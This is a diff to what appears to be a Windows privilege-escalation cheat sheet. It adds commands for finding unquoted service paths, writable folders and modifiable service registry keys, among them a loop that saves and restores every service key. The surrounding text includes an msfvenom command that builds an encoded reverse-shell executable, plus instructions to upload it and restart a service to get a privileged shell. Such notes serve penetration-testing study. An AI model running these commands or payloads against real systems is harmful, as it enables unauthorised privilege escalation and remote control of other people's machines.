@@ -16,10 +16,11 @@ wmic service list brief | findstr  "Running"
 - List unquoted services
 ```
 wmic service get name,displayname,pathname,startmode
+get-wmiobject win32_service | select name,pathname
 ```
 - Find writable folders
 ```
-.\accesschk64.exe /accepteula -uwdq "C:\Program Files\"
+.\accesschk.exe /accepteula -uwdq "C:\Program Files\"
 ```
 - DLL Hijacking
 - Privileges
@@ -36,6 +37,16 @@ Invoke-AllChecks
 msfvenom -p windows/shell_reverse_tcp LHOST=0.0.0.0 LPORT=4444 -e x86/shikata_ga_nai -f exe -o file.exe
 ```
 - Upload the payload and restart the service to get root shell
+
+## Services misconfiguration
+- list services image path
+```cmd
+reg query hklm\System\CurrentControlSet\Services /s /v imagepath
+```
+- try to write to every paths
+```
+for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a
+```
 
 ## Token Impersonation
 - check current user's privileges
